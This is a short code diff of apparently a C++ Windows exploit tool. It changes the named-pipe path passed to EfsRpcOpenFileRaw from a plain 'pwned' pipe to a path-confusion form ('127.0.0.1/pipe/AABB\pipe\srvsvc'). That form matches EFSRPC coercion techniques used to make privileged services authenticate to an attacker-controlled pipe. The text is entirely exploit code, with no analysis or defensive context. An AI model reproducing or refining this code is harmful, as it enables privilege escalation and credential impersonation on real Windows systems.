@@ -2,7 +2,6 @@
 #include <iostream>
 #include <strsafe.h>
 
-
 #pragma comment(lib, "RpcRT4.lib")
 
 
@@ -46,7 +45,7 @@ int wmain(int argc, wchar_t* argv[])
         long result;
 
         pwszFilePath = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
-        StringCchPrintf(pwszFilePath, MAX_PATH, L"\\\\127.0.0.1\\pipe\\pwned\\");
+        StringCchPrintf(pwszFilePath, MAX_PATH, L"\\\\127.0.0.1/pipe/AABB\\pipe\\srvsvc");
 
         wprintf(L"[*] Invoking EfsRpcOpenFileRaw with target path: %ws\r\n", pwszFilePath);
         result = Proc0_EfsRpcOpenFileRaw_Downlevel(Binding, &pContext, pwszFilePath, 0);
